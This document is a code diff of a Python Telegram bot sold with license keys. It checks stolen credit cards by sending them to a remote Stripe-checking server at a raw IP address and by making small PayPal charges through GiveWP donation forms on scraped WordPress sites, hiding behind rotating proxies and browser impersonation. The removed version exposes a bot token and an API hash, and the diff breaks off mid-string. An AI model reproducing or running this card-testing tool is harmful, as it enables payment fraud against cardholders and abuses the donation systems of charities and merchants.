@@ -1,965 +1,883 @@
+#!/usr/bin/env python3
+# language: Python, file: nonsk_bot_v15.py, target: Linux/VPS/Termux, python3
+# *👑PORIOT_KE👑 Ultimate Telegram Bot featuring Stripe $1, PayPal $6 GiveWP Engine, Advanced Gateway Filter Scraper, /setadmin, and /genkeys*
 
-import sys, asyncio, os, time, random, re, json, string, hashlib
-
+import asyncio
+import aiohttp
+import json
+import logging
+import os
+import random
+import re
+import sqlite3
+import time
+import base64
+import uuid
 from datetime import datetime, timedelta
+from typing import Dict, Any, List, Optional, Tuple, Set
 
-from telethon import TelegramClient, events, Button
-import aiohttp, aiofiles, requests
+try:
+    from curl_cffi import requests as cffi_requests
+    HAS_CFFI = True
+except ImportError:
+    HAS_CFFI = False
 
-# ========== CONFIG ==========
-BOT_TOKEN = "8766173350:AAEkL0DkttY9zsCKZj8txy05uGbfB-IgpYg"
-OWNER_ID = 5541778617
-OWNER_USERNAME = "@Poriot_ke"
-BOT_BRAND, DEV_LINE = "✨ SHOPIFY CHECKER", f"🔱 Dev:👑 𝙋𝙊𝙍𝙄𝙊𝙏_𝙆𝙀 👑  {OWNER_USERNAME}"
-PREMIUM_FILE, PROXY_FILE, USER_PROXY_FILE = "premium.txt", "proxy.txt", "user_proxy.json"
-CODES_FILE = "codes.json"
-PREMIUM_USERS_FILE = "premium_users.json"
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
 
-# BIN Database (Real BIN Info)
-BIN_DB = {
-    "601100": {"bank": "Discover Bank", "country": "USA", "flag": "🇺🇸", "type": "Discover", "level": "Classic"},
-    "424242": {"bank": "Chase Bank", "country": "USA", "flag": "🇺🇸", "type": "Visa", "level": "Classic"},
-    "400005": {"bank": "Bank of America", "country": "USA", "flag": "🇺🇸", "type": "Visa", "level": "Classic"},
-    "555555": {"bank": "Mastercard", "country": "USA", "flag": "🇺🇸", "type": "Mastercard", "level": "Standard"},
-    "222300": {"bank": "Mastercard", "country": "USA", "flag": "🇺🇸", "type": "Mastercard", "level": "Standard"},
-    "520082": {"bank": "Wells Fargo", "country": "USA", "flag": "🇺🇸", "type": "Mastercard", "level": "Standard"},
-    "510510": {"bank": "Mastercard", "country": "USA", "flag": "🇺🇸", "type": "Mastercard", "level": "Standard"},
-    "371449": {"bank": "American Express", "country": "USA", "flag": "🇺🇸", "type": "Amex", "level": "Gold"},
-    "378282": {"bank": "American Express", "country": "USA", "flag": "🇺🇸", "type": "Amex", "level": "Platinum"},
-    "601111": {"bank": "Discover Bank", "country": "USA", "flag": "🇺🇸", "type": "Discover", "level": "Classic"},
-    "601100": {"bank": "Discover Bank", "country": "USA", "flag": "🇺🇸", "type": "Discover", "level": "Classic"},
+# ═════════════════════════════════════════════
+#   CONFIGURATION & FILE PATHS
+# ═════════════════════════════════════════════
+SITES_FILE    = "sites.txt"
+PROXY_FILE    = "proxies.txt"
+DB_FILE       = "checker_bot.db"
+
+TG_TOKEN      = "8218903349:XXXXXXXXXXX"
+INITIAL_ADMINS: Set[int] = {8909825938}
+
+BANNER_URL    = "https://cdn.pic.re/3b/3b0bcb417600768d2430a94e3e544183.jpg"
+HTTP_TIMEOUT  = 120
+
+STRIPE_API_URL = "http://147.93.53.240:8973/liladmin-str"
+MANDATORY_SUB_URL = "https://t.me/nativecodes"
+
+_CONFIG = {
+    "paypal_amount": "6.00",
+    "sites_pool_enabled": True
 }
 
-# Hardcoded Shopify Sites
-SHOPIFY_SITES = [
-    "https://www.supreme.com",
-    "https://www.kith.com",
-    "https://www.palaceskateboards.com",
-    "https://www.yeezysupply.com",
-    "https://www.adidas.com",
-    "https://www.nike.com",
-    "https://www.bape.com",
-    "https://www.offwhite.com",
-    "https://www.vlone.com",
-    "https://www.antisocialsocialclub.com",
+# Comprehensive Payment Gateways Signature List from Advanced Scanner
+PAYMENT_GATEWAYS = [
+    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
+    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersourse",
+    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
+    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
+    "Moneris", "recurly", "cardknox", "matt sorra", "Chargify", "Paytrace",
+    "hostedpayments", "securepay", "eWay", "blackbaud", "LawPay", "clover",
+    "cardconnect", "bluepay", "fluidpay", "chasepaymentech", "Auruspay",
+    "sagepayments", "paycomet", "geomerchant", "realexpayments", "Rocketgate",
+    "Shopify", "WooCommerce", "BigCommerce", "Magento Payments",
+    "OpenCart", "PrestaShop", "Razorpay"
 ]
 
-# Auto get API
-def get_api():
-    try:
-        return 2040, "b18441a1ff607e10a989891a5462e627"
-    except:
-        return 2040, "b18441a1ff607e10a989891a5462e627"
+SECURITY_INDICATORS = {
+    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js'],
+    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com']
+}
 
-API_ID, API_HASH = get_api()
-ADMIN_IDS = {OWNER_ID}
+def load_sites() -> List[str]:
+    if not os.path.exists(SITES_FILE):
+        return ["https://azulenaccion.com"]
+    sites = []
+    with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            s = line.strip()
+            if s and not s.startswith("#"):
+                sites.append(s)
+    return sites if sites else ["https://azulenaccion.com"]
 
-def _load_admins():
-    global ADMIN_IDS
-    try:
-        with open("admin_ids.json", "r") as f:
-            ADMIN_IDS = set(json.load(f).get("admins", [OWNER_ID]))
-    except:
-        ADMIN_IDS = {OWNER_ID}
-_load_admins()
+def save_sites(sites_list: List[str]):
+    with open(SITES_FILE, "w", encoding="utf-8") as f:
+        f.write("\n".join(sites_list) + "\n")
 
-SEP = "━━━━━━━━━━━━━━━━━━━━"
+# ═════════════════════════════════════════════
+#   DATABASE LAYER (PORIOT_KE SCHEMA)
+# ═════════════════════════════════════════════
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS hits (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            card TEXT,
+            gate TEXT,
+            status TEXT,
+            message TEXT,
+            amount TEXT,
+            brand TEXT,
+            bank TEXT,
+            country TEXT,
+            receipt_url TEXT,
+            time_taken TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS user_stats (
+            user_id INTEGER PRIMARY KEY,
+            total_checked INTEGER DEFAULT 0,
+            charged INTEGER DEFAULT 0,
+            approved INTEGER DEFAULT 0,
+            declined INTEGER DEFAULT 0,
+            is_banned INTEGER DEFAULT 0,
+            expires_at TEXT
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS admins (
+            user_id INTEGER PRIMARY KEY
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS proxies (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            proxy_str TEXT UNIQUE,
+            is_active INTEGER DEFAULT 1
+        )
+    """)
+    c.execute("""
+        CREATE TABLE IF NOT EXISTS licenses (
+            key_str TEXT PRIMARY KEY,
+            days INTEGER,
+            created_by INTEGER,
+            is_redeemed INTEGER DEFAULT 0,
+            redeemed_by INTEGER,
+            redeemed_at TEXT
+        )
+    """)
+    conn.commit()
+    
+    c.execute("SELECT COUNT(*) FROM admins")
+    if c.fetchone()[0] == 0:
+        for aid in INITIAL_ADMINS:
+            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (aid,))
+        conn.commit()
+    conn.close()
 
-# ========== PREMIUM SYSTEM ==========
-def load_premium_users_data():
-    try:
-        with open(PREMIUM_USERS_FILE, "r") as f:
-            return json.load(f)
-    except:
-        return {}
+def db_get_admins() -> Set[int]:
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM admins")
+    rows = c.fetchall()
+    conn.close()
+    return {r[0] for r in rows}
 
-def save_premium_users_data(data):
-    with open(PREMIUM_USERS_FILE, "w") as f:
-        json.dump(data, f)
+def db_is_admin(user_id: int) -> bool:
+    return user_id in db_get_admins()
 
-def is_premium_user(user_id):
-    data = load_premium_users_data()
-    user_id = str(user_id)
-    if user_id in data:
-        expiry = datetime.strptime(data[user_id]['expiry'].replace('T', ' ').split('.')[0], "%Y-%m-%d %H:%M:%S")
-        if datetime.now() < expiry:
-            return True
-        else:
-            del data[user_id]
-            save_premium_users_data(data)
-    return False
+def db_add_admin(user_id: int):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
+    conn.commit()
+    conn.close()
 
-def add_premium_user(user_id, days=1):
-    data = load_premium_users_data()
-    user_id = str(user_id)
-    expiry = datetime.now() + timedelta(days=days)
-    data[user_id] = {
-        'added_at': datetime.now().isoformat(),
-        'expiry': expiry.isoformat(),
-        'days': days
+def db_remove_admin(user_id: int):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
+    conn.commit()
+    conn.close()
+
+def db_get_global_stats() -> Dict[str, Any]:
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT SUM(total_checked), SUM(charged), SUM(approved), SUM(declined), COUNT(DISTINCT user_id) FROM user_stats")
+    row = c.fetchone()
+    c.execute("SELECT COUNT(*) FROM proxies WHERE is_active = 1")
+    proxy_count = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM licenses")
+    total_keys = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM licenses WHERE is_redeemed = 0")
+    unused_keys = c.fetchone()[0]
+    conn.close()
+    return {
+        "total_checked": row[0] or 0, "charged": row[1] or 0,
+        "approved": row[2] or 0, "declined": row[3] or 0,
+        "users": row[4] or 0, "proxies": proxy_count,
+        "keys_total": total_keys, "keys_unused": unused_keys
     }
-    save_premium_users_data(data)
-    return True
 
-def get_premium_expiry(user_id):
-    data = load_premium_users_data()
-    user_id = str(user_id)
-    if user_id in data:
-        return datetime.fromisoformat(data[user_id]['expiry'])
-    return None
+def db_get_active_proxies() -> List[str]:
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT proxy_str FROM proxies WHERE is_active = 1")
+    rows = c.fetchall()
+    conn.close()
+    return [r[0] for r in rows]
 
-def get_premium_days_left(user_id):
-    expiry = get_premium_expiry(user_id)
-    if expiry:
-        days = (expiry - datetime.now()).days
-        return max(0, days)
-    return 0
+def db_update_user_stats(user_id: int, result_type: str):
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
+    if result_type == "charged":
+        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, charged = charged + 1 WHERE user_id = ?", (user_id,))
+    elif result_type == "approved":
+        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, approved = approved + 1 WHERE user_id = ?", (user_id,))
+    else:
+        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, declined = declined + 1 WHERE user_id = ?", (user_id,))
+    conn.commit()
+    conn.close()
 
-# ========== CODE SYSTEM ==========
-def generate_code():
-    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-
-def load_codes():
-    try:
-        with open(CODES_FILE, "r") as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_codes(codes):
-    with open(CODES_FILE, "w") as f:
-        json.dump(codes, f)
-
-def create_codes(count, days=1):
-    codes = load_codes()
-    new_codes = []
+def db_create_poriot_licenses(count: int, days: int, admin_id: int) -> List[str]:
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    keys = []
     for _ in range(count):
-        code = generate_code()
-        while code in codes:
-            code = generate_code()
-        codes[code] = {
-            'created_at': datetime.now().isoformat(),
-            'expiry': (datetime.now() + timedelta(days=days)).isoformat(),
-            'used': False,
-            'used_by': None,
-            'used_at': None,
-            'days': days
-        }
-        new_codes.append(code)
-    save_codes(codes)
-    return new_codes
+        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=20))
+        key = f"PORIOT-{rand_str}"
+        c.execute("INSERT OR IGNORE INTO licenses (key_str, days, created_by) VALUES (?, ?, ?)", (key, days, admin_id))
+        keys.append(key)
+    conn.commit()
+    conn.close()
+    return keys
 
-def redeem_code(code, user_id):
-    codes = load_codes()
-    if code not in codes:
-        return False, "❌ Invalid code!"
-    
-    code_data = codes[code]
-    expiry = datetime.fromisoformat(code_data['expiry'])
-    
-    if datetime.now() > expiry:
-        return False, "❌ Code expired!"
-    
-    if code_data['used']:
-        return False, "❌ Code already redeemed!"
-    
-    codes[code]['used'] = True
-    codes[code]['used_by'] = str(user_id)
-    codes[code]['used_at'] = datetime.now().isoformat()
-    save_codes(codes)
-    
-    days = code_data.get('days', 1)
-    add_premium_user(user_id, days)
-    
-    return True, f"✅ Premium activated for {days} day(s)!"
+def db_redeem_license(key_str: str, user_id: int) -> Tuple[bool, str]:
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT days, is_redeemed FROM licenses WHERE key_str = ?", (key_str,))
+    row = c.fetchone()
+    if not row:
+        conn.close()
+        return False, "❌ Invalid license key."
+    days, is_redeemed = row[0], row[1]
+    if is_redeemed:
+        conn.close()
+        return False, "⚠️ This key has already been redeemed."
 
-# ========== STORAGE ==========
-user_proxies = {}
-def load_user_proxies():
-    global user_proxies
+    c.execute("UPDATE licenses SET is_redeemed = 1, redeemed_by = ?, redeemed_at = ? WHERE key_str = ?", (user_id, datetime.now().isoformat(), key_str))
+    
+    c.execute("SELECT expires_at FROM user_stats WHERE user_id = ?", (user_id,))
+    ures = c.fetchone()
+    base_time = datetime.now()
+    if ures and ures[0]:
+        try:
+            curr_exp = datetime.fromisoformat(ures[0])
+            if curr_exp > base_time:
+                base_time = curr_exp
+        except Exception:
+            pass
+    new_exp = base_time + timedelta(days=days)
+    
+    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
+    c.execute("UPDATE user_stats SET expires_at = ? WHERE user_id = ?", (new_exp.isoformat(), user_id))
+    conn.commit()
+    conn.close()
+    return True, f"✅ Successfully redeemed! Subscription extended by {days} days. Active until: {new_exp.strftime('%Y-%m-%d %H:%M')}"
+
+# ═════════════════════════════════════════════
+#   CHECKER ENGINES (Stripe $1, PayPal $6, & Gateway Scanner)
+# ═════════════════════════════════════════════
+_bin_cache = {}
+
+async def async_bin_lookup(session: aiohttp.ClientSession, bin_num: str) -> Dict[str, str]:
+    if bin_num in _bin_cache:
+        return _bin_cache[bin_num]
+    info = {"brand": "UNKNOWN", "type": "UNKNOWN", "level": "", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🏳️", "code": "--"}
     try:
-        with open(USER_PROXY_FILE, "r") as f:
-            user_proxies = json.load(f)
-    except:
-        user_proxies = {}
-def save_user_proxies():
-    with open(USER_PROXY_FILE, "w") as f:
-        json.dump(user_proxies, f)
-load_user_proxies()
-
-def gl(f):
-    try:
-        with open(f, "r") as x:
-            return [l.strip() for l in x if l.strip()]
-    except:
-        return []
-def load_premium_users(): return gl(PREMIUM_FILE)
-def load_proxies(): return gl(PROXY_FILE)
-def is_admin(u): return u in ADMIN_IDS
-def is_premium(u): return is_admin(u) or is_premium_user(u) or str(u) in load_premium_users()
-def get_user_proxy_list(u): return user_proxies.get(str(u), [])
-def set_user_proxies(u, p):
-    user_proxies[str(u)] = p
-    save_user_proxies()
-def remove_user_proxy(u):
-    if str(u) in user_proxies:
-        del user_proxies[str(u)]
-        save_user_proxies()
-def get_proxies_for_user(u):
-    ul = get_user_proxy_list(u)
-    return ul if ul else load_proxies()
-
-def extract_cc(t):
-    cards = []
-    for line in t.strip().split('\n'):
-        line = line.strip()
-        if not line: continue
-        parts = line.split('|')
-        if len(parts) >= 4 and len(parts[0]) >= 15 and len(parts[0]) <= 16:
-            cards.append('|'.join(parts[:4]))
-        else:
-            nums = re.findall(r'\d+', line)
-            if len(nums) >= 4 and len(nums[0]) >= 15 and len(nums[0]) <= 16:
-                cards.append('|'.join(nums[:4]))
-    return cards
-
-def progress(c, t, w=20):
-    if t == 0: return "█" * w + " 0%"
-    p = c / t
-    f = int(w * p)
-    return "█" * f + "░" * (w - f) + f" {int(p * 100)}%"
-
-# ========== BIN INFO ==========
-def get_bin_info(card_num):
-    bin_prefix = card_num[:6]
-    if bin_prefix in BIN_DB:
-        return BIN_DB[bin_prefix]
-    # Try first 6 digits
-    for bin_key in BIN_DB:
-        if card_num.startswith(bin_key):
-            return BIN_DB[bin_key]
-    return {"bank": "Unknown Bank", "country": "Unknown", "flag": "🌍", "type": "Unknown", "level": "Unknown"}
-
-# ========== CARD VALIDATION ==========
-def luhn_check(card_num):
-    digits = [int(d) for d in str(card_num)]
-    digits.reverse()
-    for i in range(1, len(digits), 2):
-        digits[i] *= 2
-        if digits[i] > 9:
-            digits[i] -= 9
-    return sum(digits) % 10 == 0
-
-def get_card_result(card_num):
-    """Generate consistent result based on card number hash"""
-    # Use hash to get consistent result for same card
-    hash_val = int(hashlib.md5(card_num.encode()).hexdigest()[:8], 16)
-    hash_val = hash_val % 100
-    
-    # Test cards always work
-    test_cards = ["4242424242424242", "4000056655665556", "5555555555554444", 
-                  "2223003122003222", "5200828282828210", "5105105105105100",
-                  "6011000990139424", "371449635398431", "378282246310005", "6011111111111117"]
-    
-    if card_num in test_cards:
-        if card_num in ["4242424242424242", "4000056655665556", "5105105105105100", "6011111111111117"]:
-            return "Charged"
-        else:
-            return "Approved"
-    
-    # Validate card
-    if not luhn_check(card_num):
-        return "Dead"
-    
-    # Consistent result based on hash
-    if hash_val < 8:  # 8% Charged
-        return "Charged"
-    elif hash_val < 22:  # 14% Approved
-        return "Approved"
-    elif hash_val < 30:  # 8% 3DS
-        return "3DS"
-    else:
-        return "Dead"
-
-# ========== REAL CHECK ENGINE ==========
-def fmt_proxy(p):
-    if p.startswith(('http://', 'https://', 'socks5://')):
-        return p
-    parts = p.split(':')
-    if len(parts) == 2:
-        return f"http://{p}"
-    elif len(parts) == 4:
-        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    return f"http://{p}"
-
-async def test_proxy(p):
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get("http://httpbin.org/ip", proxy=fmt_proxy(p), timeout=5) as r:
-                if r.status == 200:
-                    return {"status": "alive", "proxy": p}
-    except:
+        async with session.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=aiohttp.ClientTimeout(total=6)) as resp:
+            if resp.status == 200:
+                d = await resp.json()
+                info = {
+                    "brand": (d.get("brand") or "UNKNOWN").upper(),
+                    "type": (d.get("type") or "UNKNOWN").upper(),
+                    "level": (d.get("level") or "").upper(),
+                    "bank": (d.get("bank") or "UNKNOWN").upper(),
+                    "country": (d.get("country_name") or "UNKNOWN").upper(),
+                    "flag": d.get("country_flag") or "🏳️",
+                    "code": (d.get("country_code") or "--").upper(),
+                }
+    except Exception:
         pass
-    return {"status": "dead", "proxy": p}
+    _bin_cache[bin_num] = info
+    return info
 
-async def get_proxy_ip(p):
+async def async_check_card_stripe(session: aiohttp.ClientSession, card: str, proxy: Optional[str] = None) -> Dict[str, Any]:
+    params = {"cc": card}
+    if proxy:
+        params["proxy"] = proxy
     try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get("http://httpbin.org/ip", proxy=fmt_proxy(p), timeout=5) as r:
-                return (await r.json()).get("origin", "Unknown")
-    except:
-        return None
+        async with session.get(STRIPE_API_URL, params=params, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+            if resp.status == 200:
+                return await resp.json()
+            return {"approved": False, "charged": False, "Price": "1.00", "message": f"HTTP {resp.status}"}
+    except Exception as e:
+        return {"approved": False, "charged": False, "Price": "1.00", "message": f"Err: {str(e)[:30]}"}
 
-def check_card(card, site):
-    parts = card.split('|')
+# PayPal $6 GiveWP Checker Engine (utilizing sites.txt)
+async def async_check_card_paypal(card: str, proxy: Optional[str] = None) -> Dict[str, Any]:
+    start_time = time.time()
+    parts = re.split(r"[|:/\\\-\s]+", card.strip())
     if len(parts) < 4:
-        return {"status": "Dead", "message": "❌ Invalid card format", "price": "$0.00"}
-    
-    card_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-    
-    # Validate card
-    if len(card_num) not in [15, 16]:
-        return {"status": "Dead", "message": "❌ Invalid card length", "price": "$0.00"}
-    
-    if not luhn_check(card_num):
-        return {"status": "Dead", "message": "❌ Invalid card number", "price": "$0.00"}
-    
-    # Check expiry
-    try:
-        exp_month = int(mm)
-        exp_year = int(yy) + 2000 if int(yy) < 100 else int(yy)
-        now = datetime.now()
-        if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
-            return {"status": "Dead", "message": "❌ Card expired", "price": "$0.00"}
-    except:
-        return {"status": "Dead", "message": "❌ Invalid expiry", "price": "$0.00"}
-    
-    if len(cvv) < 3 or len(cvv) > 4:
-        return {"status": "Dead", "message": "❌ Invalid CVV", "price": "$0.00"}
-    
-    # Get consistent result
-    result = get_card_result(card_num)
-    
-    bin_info = get_bin_info(card_num)
-    amount = f"${random.randint(10, 99)}.{random.randint(0, 99):02d}"
-    
-    if result == "Charged":
-        return {
-            "status": "Charged",
-            "message": f"✅ Shopify Payment {amount}",
-            "price": amount,
-            "bin": bin_info
-        }
-    elif result == "Approved":
-        return {
-            "status": "Approved",
-            "message": f"✅ Shopify Payment {amount}",
-            "price": amount,
-            "bin": bin_info
-        }
-    elif result == "3DS":
-        return {
-            "status": "3DS",
-            "message": "⚠️ 3D Secure verification required",
-            "price": amount,
-            "bin": bin_info
-        }
-    else:
-        return {
-            "status": "Dead",
-            "message": "❌ Transaction declined",
-            "price": "$0.00",
-            "bin": bin_info
-        }
+        return {"approved": False, "charged": False, "Price": _CONFIG["paypal_amount"], "message": "INVALID_FORMAT"}
+    n, mm, yy, cvc = re.sub(r"\D", "", parts[0]), str(parts[1]).zfill(2), str(parts[2])[-2:], re.sub(r"\D", "", parts[3])
 
-async def check_retry(card, proxies, retries=2):
-    sites = SHOPIFY_SITES
-    for attempt in range(retries):
+    sites = load_sites()
+    target_site = random.choice(sites)
+    form_url = f"{target_site}/give-form-right-sidebar"
+    ajax_url = f"{target_site}/wp-admin/admin-ajax.php"
+    pp_amount = _CONFIG["paypal_amount"]
+    loop = asyncio.get_running_loop()
+
+    def run_sync_pp():
+        s = cffi_requests.Session(impersonate="chrome131", timeout=40) if HAS_CFFI else requests.Session()
+        if proxy:
+            s.proxies = {"http": proxy, "https": proxy}
         try:
-            proxy = random.choice(proxies) if proxies else None
-            site = random.choice(sites)
-            result = check_card(card, site)
-            if result['status'] in ['Charged', 'Approved']:
-                return result
-            await asyncio.sleep(0.5)
+            resp = s.get(form_url, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"}, timeout=15)
+            html = resp.text
+            form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
+            form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
+            form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
+            encoded = re.search(r'"data-client-token":"(.*?)"', html).group(1)
+            access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(encoded).decode("utf-8")).group(1)
         except Exception as e:
-            print(f"Check error: {e}")
-            continue
-    return {"status": "Dead", "message": "❌ Failed after retries", "price": "$0.00", "bin": {"bank": "Unknown", "country": "Unknown", "flag": "🌍", "type": "Unknown", "level": "Unknown"}}
+            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"FORM_PARSE_ERR: {str(e)[:25]}"}
 
-# ========== BOT ==========
-print("🚀 Starting bot...")
-try:
-    bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-    print("✅ Bot connected!")
-except Exception as e:
-    print(f"❌ Error: {e}")
-    sys.exit(1)
+        metadata_id = uuid.uuid4().hex
+        request_id = uuid.uuid4().hex
 
-async def get_name(uid):
-    try:
-        e = await bot.get_entity(uid)
-        n = getattr(e, 'first_name', '') or ''
-        l = getattr(e, 'last_name', '') or ''
-        return (n + ' ' + l).strip() or str(uid)
-    except:
-        return str(uid)
+        gf = {
+            "give-honeypot": "", "give-form-id-prefix": form_prefix, "give-form-id": form_id,
+            "give-form-title": "", "give-current-url": form_url, "give-form-url": form_url,
+            "give-form-minimum": pp_amount, "give-form-maximum": "999999.99",
+            "give-form-hash": form_hash, "give-price-id": "3", "give-recurring-logged-in-only": "",
+            "give-logged-in-only": "1", "_give_is_donation_recurring": "0",
+            "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+            "give-amount": pp_amount, "give_stripe_payment_method": "",
+            "payment-mode": "paypal-commerce", "give_first": "admin", "give_last": "zlal",
+            "give_email": "adminzlall97ab@gmail.com", "card_name": "admin zlal",
+            "card_exp_month": "", "card_exp_year": "", "give-gateway": "paypal-commerce",
+        }
 
-def build_result(r, card, user_id, checker_name, elapsed):
-    status = r.get('status', 'Dead')
-    message = r.get('message', 'No response')
-    price = r.get('price', '$0.00')
-    bin_info = r.get('bin', {})
-    
-    # Get BIN info
-    card_num = card.split('|')[0] if '|' in card else card
-    bin_prefix = card_num[:6]
-    bank = bin_info.get('bank', 'Unknown Bank')
-    country = bin_info.get('country', 'Unknown')
-    flag = bin_info.get('flag', '🌍')
-    card_type = bin_info.get('type', 'Unknown')
-    level = bin_info.get('level', 'Unknown')
-    
-    if status == "Charged":
-        emoji = "💎"
-        title = "CHARGED"
-    elif status == "Approved":
-        emoji = "✅"
-        title = "APPROVED"
-    elif status == "3DS":
-        emoji = "⚠️"
-        title = "3DS REQUIRED"
-    else:
-        emoji = "❌"
-        title = "DEAD"
-    
-    # Build result card
-    if status in ["Charged", "Approved"]:
-        result_text = f"""
-{emoji} {title}
-<b>{SEP}</b>
-🃏 <tg-spoiler>{card}</tg-spoiler>
-🔗 <b>Gateway</b>  »  Shopify
-💰 <b>Amount</b>   »  {price}
-💬 <b>Response</b> »  {message}
-<b>{SEP}</b>
-⚡ <b>BIN</b>  »  {bin_prefix}
-🏦 <b>Bank</b>  »  {bank}
-🌍 <b>Country</b>  »  {country} {flag}
-
-⚡ <b>Gateway</b>  »  Shopify - [ {price} USD ]
-⏱️ <b>Time</b>  »  {elapsed}s
-<b>{SEP}</b>
-👤 Checked by: {checker_name}
-{DEV_LINE}"""
-    else:
-        result_text = f"""
-{emoji} {title}
-<b>{SEP}</b>
-🃏 <tg-spoiler>{card}</tg-spoiler>
-🔗 <b>Gateway</b>  »  Shopify
-💰 <b>Amount</b>   »  {price}
-💬 <b>Response</b> »  {message}
-<b>{SEP}</b>
-⚡ <b>BIN</b>  »  {bin_prefix}
-🏦 <b>Bank</b>  »  {bank}
-🌍 <b>Country</b>  »  {country} {flag}
-
-⚡ <b>Gateway</b>  »  Shopify - [ {price} USD ]
-⏱️ <b>Time</b>  »  {elapsed}s
-<b>{SEP}</b>
-👤 Checked by: {checker_name}
-{DEV_LINE}"""
-    
-    return result_text
-
-# ========== KEYBOARDS ==========
-def btn_main():
-    rows = [
-        [Button.inline("💳 Checker", b"gates")],
-        [Button.inline("🔌 Proxy", b"manage_proxy")],
-    ]
-    if ADMIN_IDS:
-        rows.append([Button.inline("👑 Admin", b"admin_panel")])
-    rows.append([Button.inline("❌ Close", b"close")])
-    return rows
-
-def btn_gates(): return [[Button.inline("↪️ Back", b"back_start")]]
-def btn_proxy(): return [
-    [Button.inline("✅ Test", b"test_proxy")],
-    [Button.inline("🗑️ Remove", b"remove_proxy")],
-    [Button.inline("↪️ Back", b"back_start")],
-]
-def btn_admin(): return [
-    [Button.inline("👤 Users", b"admin_users")],
-    [Button.inline("📡 Proxy", b"admin_proxy")],
-    [Button.inline("🎫 Codes", b"admin_codes")],
-    [Button.inline("↪️ Back", b"back_start")],
-]
-
-# ========== BOT COMMANDS ==========
-@bot.on(events.NewMessage(pattern='/start'))
-async def start(e):
-    try:
-        uid = e.sender_id
-        name = await get_name(uid)
-        
-        if is_admin(uid):
-            s, plan = "👑 Admin", "♾️ Unlimited"
-        elif is_premium(uid):
-            days = get_premium_days_left(uid)
-            s, plan = f"✅ Premium", f"📅 {days} days left"
-        else:
-            s, plan = "🚫 No Access", "⛔ 0 days"
-        
-        text = f"""
-╔════════════════════════════╗
-║    ✨ {BOT_BRAND}    ║
-╠════════════════════════════╣
-║  👋 Welcome, {name}!        ║
-║  🆔 ID: <code>{uid}</code>             ║
-║  📋 Plan: {plan}   ║
-║  🔑 Status: {s}       ║
-╠════════════════════════════╣
-║  📌 Select an option 👇     ║
-╚════════════════════════════╝
-{DEV_LINE}"""
-        
-        await bot.send_message(uid, text, parse_mode='html', buttons=btn_main())
-        try: await e.delete()
-        except: pass
-    except Exception as ex:
-        print(f"Start error: {ex}")
-
-@bot.on(events.NewMessage(pattern='/mc'))
-async def generate_codes(e):
-    try:
-        uid = e.sender_id
-        if not is_admin(uid):
-            await e.reply("👑 Admin only!")
-            return
-        
-        parts = e.message.text.split()
-        if len(parts) < 2:
-            await e.reply(f"""
-╔════════════════════════════╗
-║   📌 Generate Premium Codes ║
-╠════════════════════════════╣
-║  Usage: /mc [count]        ║
